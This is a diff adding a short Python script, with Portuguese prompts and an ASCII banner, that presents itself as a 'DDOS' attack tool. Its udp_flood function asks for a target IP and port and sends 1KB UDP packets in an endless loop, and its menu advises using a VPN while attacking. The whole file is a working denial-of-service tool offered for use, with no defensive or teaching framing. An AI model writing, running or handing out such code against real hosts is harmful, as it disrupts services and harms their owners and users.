@@ -1,0 +1,72 @@
+import os
+import socket
+from time import sleep
+
+
+def clearscreen():
+    os.system('clear')
+
+def udp_flood():
+    # Solicitar IP e porta ao usuário
+    target_ip = input("Digite o IP alvo: ")
+    target_port = int(input("Digite a porta alvo: "))
+    
+    # Configurar socket UDP
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    data = b"A" * 1024  # Dados de 1KB
+    
+    try:
+        while True:
+            sock.sendto(data, (target_ip, target_port))
+            print(f"Enviado pacote UDP para {target_ip}:{target_port}")
+    except KeyboardInterrupt:
+        print("\nAtaque interrompido pelo usuário")
+    finally:
+        sock.close()
+
+
+
+
+def mainmenu():
+        clearscreen()
+        print("@@@@@@@@   @@@@@@    @@@@@@    @@@@@@@  @@@  @@@@@@@@  @@@@@@@  @@@ @@@")
+        sleep(.1)
+        print("@@@@@@@@  @@@@@@@   @@@@@@@@  @@@@@@@@  @@@  @@@@@@@@  @@@@@@@  @@@ @@@")
+        sleep(.1)
+        print("@@!       !@@       @@!  @@@  !@@       @@!  @@!         @@!    @@! !@@")
+        sleep(.1)
+        print("!@!       !@!       !@!  @!@  !@!       !@!  !@!         !@!    !@! @!!")
+        sleep(.1)
+        print("@!!!:!    !!@@!!    @!@  !@!  !@!       !!@  @!!!:!      @!!     !@!@!")
+        sleep(.1)
+        print("!!!!!:     !!@!!!   !@!  !!!  !!!       !!!  !!!!!:      !!!      @!!!")
+        sleep(.1)
+        print("!!:            !:!  !!:  !!!  :!!       !!:  !!:         !!:      !!:")
+        sleep(.1)
+        print(":!:           !:!   :!:  !:!  :!:       :!:  :!:         :!:      :!:")
+        sleep(.1)
+        print(" ::       :::: ::   ::::: ::   ::: :::   ::   :: ::::     ::       ::")
+        sleep(.1)
+        print(":        :: : :     : :  :    :: :: :  :    : :: ::      :        :")
+        sleep(5)
+        print("Escolha uma opção...")
+        sleep(.1)
+        print("[1] Attack DDOS")
+        print("[2] Exit")
+        choice = input("Digite sua opção: ")
+        
+        if choice == '1':
+            print("For this tools is recomended use vpn")
+            sleep(0.5)
+            print("Starting function!")
+            sleep(0.1)
+            udp_flood()
+              
+        if choice == '2':
+            exit()
+            
+        if choice == '3':
+            print("Opção inválida!")
+            
+if __name__ == "__main__":
+    mainmenu()
